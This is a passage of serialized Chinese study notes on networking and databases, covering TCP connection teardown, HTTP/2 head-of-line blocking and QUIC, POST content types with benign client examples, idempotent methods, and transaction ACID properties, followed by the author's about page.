第二次挥手：表示服务器知道客户端不再发送数据\n\t\t- 第三次挥手：表示服务器数据发送完毕，准备关闭连接\n\t\t- 第四次挥手：确认收到服务器的 FIN，客户端发送 ACK 包，进入 TIME_WAIT 状态\n\t- 支持半关闭\n\t- 处理延迟和重传\n\t- 防止旧连接干扰\n![图片&文件](./files/20241026-10.png)\n\n## 9. HTTP 协议的理解\n\nHTTP 是一个在`计算机世界`里专门在两点之间传输文字、图片、音频、视频等超文本数据的约定和规范\n\n## 10. 常见的 HTTP 请求\n\n![图片&文件](./files/20241026-11.png)\n\n## 11. 简述 HTTP 内容协商\n\n根据请求中的所有信息，服务器可以有不同响应\n\n## 12. HTTP 缓存机制\n\n![图片&文件](./files/20241026-12.png)\n\n## 13. 为什么 HTTP2 下，一个 TCP 包丢失会阻塞所有流\n\n### 13.1. 根本原因\n\n1. **TCP 的可靠性机制**\n   - TCP 使**用序列号**确保数据包的==有序传输==\n   - 当一个包丢失时，接收方会等待该包重传\n   - 即使后续包已到达，**也必须等待丢失包重传后才能交付给应用层**\n2. **HTTP/2 的多路复用**\n   - HTTP/2 在**单个 TCP 连接上**复用多个流\n   - 所有流的数据都被序列化到同一个 TCP 连接中\n   - 不同流的数据帧交错传输\n\n### 13.2. 阻塞过程\n\n1. **数据包丢失场景**\n```plaintext\nTCP 数据流：\n[包1] [包2] [包3] [包4] [包5]\n         ↓ (丢失)\n[包1] [空缺] [包3] [包4] [包5]\n```\n\n2. **阻塞影响**\n   - 包2丢失后，包3、4、5虽然已到达\n   - 但==由于 TCP 的顺序保证，这些包无法上交给应用层==\n   - 导致所有 HTTP/2 流都被阻塞，直到包2重传成功\n\n### 13.3. 具体影响\n\n1. **多路复用的限制**\n   - 虽然 HTTP/2 解决了应用层的队头阻塞\n   - 但**将问题转移到了传输层**\n   - 一个包的丢失会影响所有并行的 HTTP 请求\n\n2. **性能影响**\n   - 在高丢包率的网络环境下性能下降明显\n   - 重传延迟会导致所有流的延迟增加\n   - 特别是在移动网络等不稳定环境中问题更突出\n\n### 13.4. 解决方案\n\n1. **HTTP/3 和 QUIC**\n   - 基于 UDP 实现可靠传输\n   - 每个流独立处理丢包\n   - 一个流的包丢失不会影响其他流 \n\n2. **优化建议**\n   - 在高丢包环境下考虑使用多个 TCP 连接\n   - 合理设置 TCP 重传超时时间\n   - 考虑启用 TCP BBR 等现代拥塞控制算法\n\n### 13.5. 为什么这是个问题？\n\n1. **TCP 设计理念**\n   - TCP 设计初衷是提供可靠的字节流服务\n   - 严格的顺序保证是其核心特性\n   - 这与 HTTP/2 的并行传输需求存在冲突\n\n2. **现代网络特点**\n   - 互联网环境复杂多变\n   - 移动网络丢包率相对较高\n   - 延迟敏感的应用越来越多\n\n这就是为什么在 HTTP/3 中，通过使用 QUIC 协议（基于 UDP）来解决这个问题。\n\nQUIC 将可靠性控制从传输层移到应用层，允许更灵活的包处理策略，从而避免了 TCP 层面的队头阻塞问题。","Qx4lLzTV":"\n# 常见的几种 POST 数据提交方式\n\n`#http` `#计算机网络`\n\n## 目录\n<!-- toc -->\n ## 1. application/x-www-form-urlencoded（默认） \n\n这是最常见的 POST 提交数据的方式，浏览器的原生 **form 表单**如果不设置 `enctype 属性`，默认会以这种方式提交数据。\n\n```http\nContent-Type: application/x-www-form-urlencoded\n\nname=John+Doe&age=30\n```\n\n## 2. multipart/form-data\n\n这种方式主要用于上传文件，也可以用于提交普通表单数据。\n\n```http\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW\n\n------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"name\"\n\nJohn Doe\n------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"file\"; filename=\"example.txt\"\nContent-Type: text/plain\n\n(file content here)\n------WebKitFormBoundary7MA4YWxkTrZu0gW--\n```\n\n## 3. application/json\n\n现在越来越多的 API 使用 JSON 格式传输数据。\n\n```http\nContent-Type: application/json\n\n{\n  \"name\": \"John Doe\",\n  \"age\": 30\n}\n```\n\n## 4. text/plain\n\n纯文本格式。\n\n```http\nContent-Type: text/plain\n\nSome plain text content\n```\n\n## 5. application/xml\n\nXML 格式。\n\n```http\nContent-Type: application/xml\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<user>\n  <name>John Doe</name>\n  <age>30</age>\n</user>\n```\n\n## 6. application/octet-stream\n\n用于发送二进制数据。\n\n```http\nContent-Type: application/octet-stream\n\n(Binary data)\n```\n\n## 7. 示例\n\n让我们看一些代码示例，展示如何使用不同的方式发送 POST 请求：\n\n1. 使用 HTML 表单（application/x-www-form-urlencoded）：\n\n```html\n<form action=\"/submit\" method=\"post\">\n  <input type=\"text\" name=\"name\" value=\"John Doe\">\n  <input type=\"number\" name=\"age\" value=\"30\">\n  <input type=\"submit\" value=\"Submit\">\n</form>\n```\n\n2. 使用 HTML 表单（multipart/form-data）：\n\n```html hl:2\n<form action=\"/upload\" method=\"post\" \n\t  enctype=\"multipart/form-data\">\n  <input type=\"text\" name=\"name\" value=\"John Doe\">\n  <input type=\"file\" name=\"file\">\n  <input type=\"submit\" value=\"Upload\">\n</form>\n```\n\n3. 使用 JavaScript 发送 JSON 数据：\n\n```javascript\nfetch('/api/user', {\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/json',\n  },\n  body: JSON.stringify({\n    name: 'John Doe',\n    age: 30\n  })\n})\n.then(response => response.json())\n.then(data => console.log(data))\n.catch((error) => console.error('Error:', error));\n```\n\n4. 使用 Python requests 库发送不同类型的 POST 请求：\n\n```python\nimport requests\n\n# application/x-www-form-urlencoded\nresponse = requests.post('https://httpbin.org/post', data={'key': 'value'})\n\n# multipart/form-data\nfiles = {'file': open('example.txt', 'rb')}\nresponse = requests.post('https://httpbin.org/post', files=files)\n\n# application/json\nresponse = requests.post('https://httpbin.org/post', json={'key': 'value'})\n\n# text/plain\nheaders = {'Content-Type': 'text/plain'}\nresponse = requests.post('https://httpbin.org/post', data='Some text', headers=headers)\n\nprint(response.text)\n```\n\n5. 使用 Node.js 的 axios 库发送 POST 请求：\n\n```javascript\nconst axios = require('axios');\n\n// application/x-www-form-urlencoded\naxios.post('https://httpbin.org/post', 'name=John&age=30', {\n  headers: { 'Content-Type': 'application/x-www-form-urlencoded' }\n})\n.then(response => console.log(response.data))\n.catch(error => console.error('Error:', error));\n\n// application/json\naxios.post('https://httpbin.org/post', {\n  name: 'John',\n  age: 30\n})\n.then(response => console.log(response.data))\n.catch(error => console.error('Error:', error));\n\n// multipart/form-data\nconst FormData = require('form-data');\nlet form = new FormData();\nform.append('name', 'John');\nform.append('file', fs.createReadStream('example.txt'));\n\naxios.post('https://httpbin.org/post', form, {\n  headers: form.getHeaders()\n})\n.then(response => console.log(response.data))\n.catch(error => console.error('Error:', error));\n```\n\n在选择 POST 数据提交方式时，需要考虑以下因素：\n\n1. 服务器端的支持情况\n2. 数据的类型和结构\n3. 是否需要上传文件\n4. API 的设计规范\n5. 客户端的兼容性\n\n不同的数据提交方式适用于不同的场景，选择合适的方式可以提高数据传输的效率和可靠性。","I5aIYFHE":"\n# 幂等与非幂等、HTTP 常见状态码\n\n`#http` `#计算机网络`\n\n\n## 目录\n<!-- toc -->\n ## 1. 幂等请求与非幂等请求 \n\n- 幂等\n\t- get \n\t- delete\n\t- put\n- 非幂等请求\n\t- post\n\n## 2. 常见的 HTTP 状态码\n\n![图片&文件](./files/20241023-9.png)\n\n","zYNSbsE2":"\n# 前言\n\n\n> 数据库相关的知识\n\n\n","p7EV1tfp":"\n# 数据库事务（Transaction）的概念和重要性\n\n\n`#数据库`\n\n\n## 目录\n<!-- toc -->\n ## 1. 什么是事务？ \n\n事务是**一组需要作为一个整体执行的操作序列**\n- 比如转账就是一个典型的事务，包含两个关键步骤：\n\t- 从 A 账户扣款\n\t- 向 B 账户存款\n\n## 2. 事务的 ACID 特性\n\n- 原子性（Atomicity）：\n\t- 事务中的所有操作要么全部完成，要么全部不完成\n\t- 例子：转账必须确保扣款和存款都成功完成，否则就需要回滚\n- 一致性（Consistency）：\n\t- 事务必须使数据库从一个**一致性状态**转换到另一个**一致性状态**\n\t- 例子：转账前后**所有账户的总金额**保持不变\n- 隔离性（Isolation）：\n\t- 多个事务并发执行时，每个事务都应该感觉不到其他事务的存在\n\t- 比如当 `A` 给 `B` 转账时，其他人的转账操作不应该干扰这个过程\n- 持久性（Durability）：\n\t- 一旦事务提交，其结果应该永久保存在数据库中\n\t- 即使系统崩溃，已提交的转账结果也不会丢失\n\n## 3. 事务的状态\n\n事务通常有以下几个状态：\n- 开始（Begin）：事务开始执行\n- 执行（Active）：执行各种数据操作\n- 提交（Commit）：确认所有操作都成功，永久保存结果\n- 回滚（Rollback）：如果出现错误，撤销所有操作\n\n## 转账失败的事务案例：余额不足\n\n1. 当A 向 B 尝试转账时，发现超过账户余额时，事务检测到错误条件（余额不足）\n2. 系统立即触发回滚操作\n3. 所有账户余额恢复到事务开始前的状态\n4. 整个事务被取消，没有任何账户的余额发生变化\n\n这就展示了事务的`原子性`：要么所有操作都成功执行，要么一个操作都不执行。这对于维护数据的一致性非常重要，特别是在处理金融交易这样的关键业务时。\n\n事务的这些特性确保了：\n- 不会出现钱从一个账户扣除了，但没有存入另一个账户的情况\n- 系统故障或错误不会导致账户余额不一致\n- 并发操作`不会相互干扰`\n- 一旦事务提交，数据的修改就是`永久`的\n\n这就是为什么在数据库系统中，事务处理机制是保证数据一致性和可靠性的核心机制。","XbGMQ0Fa":"\n# 关于\n\n`#后记`  `#后序`   `#about`  \n\n\n## 目录\n<!-- toc -->\n ## 联系我 \n\n- 个人邮箱： liguwe@qq.com\n- 个人微信：liguwe (请备注：`832`)\n- 个人站点： [个人站点](https://liguwe.site)\n- Github：[Github](http://github.com/liguwe)\n\n## 问题反馈\n\n如果您发现了错误，您可通过以下途径来反馈给我：\n\n- **反馈方式**：[Github New Issues](https://github.com/liguwe/liguwe.github.io/issues/new)\n\n> 欢迎任何形式的改进意见和建议，多多指教，谢谢！\n\n## 致谢\n\n- 感谢 [mdbook](https://rust-lang.github.io/mdBook/) 提供的电子书生成工具\n- 感谢 [Github](https://github.com/) 提供的代码托管服务及静态页面服务\n"}